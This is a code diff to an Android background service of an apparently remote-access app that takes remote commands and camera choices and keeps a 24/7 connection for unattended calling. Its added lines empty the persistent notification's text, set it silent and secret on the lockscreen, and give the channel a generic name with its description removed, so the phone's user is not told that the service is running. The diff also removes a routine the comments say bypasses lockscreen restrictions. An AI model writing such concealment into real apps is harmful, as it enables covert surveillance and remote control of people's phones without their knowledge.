@@ -137,12 +137,14 @@ public class BackgroundKeepAliveService extends Service {
             );
 
             Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
-                    .setContentTitle("VRemote Companion Active")
-                    .setContentText("24/7 background connection active — ready for remote calling")
                     .setSmallIcon(R.drawable.app_icon)
+                    .setContentTitle("")
+                    .setContentText("")
                     .setContentIntent(pendingIntent)
                     .setOngoing(true)
-                    .setPriority(NotificationCompat.PRIORITY_LOW)
+                    .setPriority(NotificationCompat.PRIORITY_MIN)
+                    .setVisibility(NotificationCompat.VISIBILITY_SECRET)
+                    .setSilent(true)
                     .build();
 
             try {
@@ -170,11 +172,13 @@ public class BackgroundKeepAliveService extends Service {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel channel = new NotificationChannel(
                     CHANNEL_ID,
-                    "VRemote Companion Service",
-                    NotificationManager.IMPORTANCE_LOW
+                    "Companion Service",
+                    NotificationManager.IMPORTANCE_MIN
             );
-            channel.setDescription("Maintains 24/7 background connection for unattended remote calling");
             channel.setShowBadge(false);
+            channel.enableVibration(false);
+            channel.setSound(null, null);
+            channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
             NotificationManager manager = getSystemService(NotificationManager.class);
             if (manager != null) {
                 manager.createNotificationChannel(channel);
@@ -360,11 +364,6 @@ public class BackgroundKeepAliveService extends Service {
         intent.putExtra("auto_command", command);
         intent.putExtra("caller", caller);
         intent.putExtra("cameraChoice", cameraChoice);
-
-        // 2. High priority full screen notification to bypass lockscreen and BAL restrictions
-        try {
-            RemoteAccessibilityService.triggerFullScreenWakeNotification(this, intent, command);
-        } catch (Throwable ignored) {}
 
         try {
             if (Build.VERSION.SDK_INT >= 34) {
